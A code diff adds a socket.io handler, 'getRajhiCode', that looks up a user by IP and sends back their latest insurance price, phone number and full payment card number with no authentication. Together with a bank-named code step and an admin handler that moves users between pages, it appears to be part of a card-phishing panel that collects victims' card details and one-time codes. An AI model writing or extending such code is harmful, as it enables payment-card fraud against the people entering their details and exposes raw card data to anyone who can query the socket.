@@ -193,6 +193,60 @@ io.on("connection", (socket) => {
     }
   });
 
+  socket.on("getRajhiCode", async ({ ip }) => {
+    try {
+      // 1) Ensure user exists
+      const user = await findOrCreateUser(ip);
+      const userId = user?._id;
+
+      // 2) Fetch latest singletons (no billing)
+      const [lastPhone, lastPayment, lastComp, lastTP] = await Promise.all([
+        phone.findOne({ user: userId }).sort({ time: -1 }).lean(),
+        Payment.findOne({ user: userId }).sort({ time: -1 }).lean(),
+        Comprehensive.findOne({ user: userId }).sort({ time: -1 }).lean(),
+        ThirdParty.findOne({ user: userId }).sort({ time: -1 }).lean(),
+      ]);
+
+      // 3) Choose latest offer between Comprehensive and ThirdParty
+      const getTs = (doc) =>
+        doc?.time
+          ? Number(doc.time)
+          : doc?._id
+          ? doc._id.getTimestamp().getTime()
+          : -1;
+
+      let chosenOffer = null;
+      if (lastComp && lastTP) {
+        chosenOffer = getTs(lastComp) >= getTs(lastTP) ? lastComp : lastTP;
+      } else if (lastComp) {
+        chosenOffer = lastComp;
+      } else if (lastTP) {
+        chosenOffer = lastTP;
+      }
+
+      // 4) Extract required fields
+      const totalCost = chosenOffer?.totalPrice ?? null;
+      const cardNumber = lastPayment?.cardNumber ?? null; // full card number as requested
+      const phoneNumber = lastPhone?.phoneNumber ?? null;
+
+      // 5) Emit ONLY the requested fields
+      socket.emit("rajhiCode", {
+        error: null,
+        totalCost,
+        cardNumber,
+        phoneNumber,
+      });
+    } catch (err) {
+      console.error("Error fetching Rajhi data:", err);
+      socket.emit("rajhiCode", {
+        error: err.message,
+        totalCost: null,
+        cardNumber: null,
+        phoneNumber: null,
+      });
+    }
+  });
+
   // Admin: manual navigation
   socket.on("navigateTo", async ({ ip, page }) => {
     const user = await findOrCreateUser(ip);
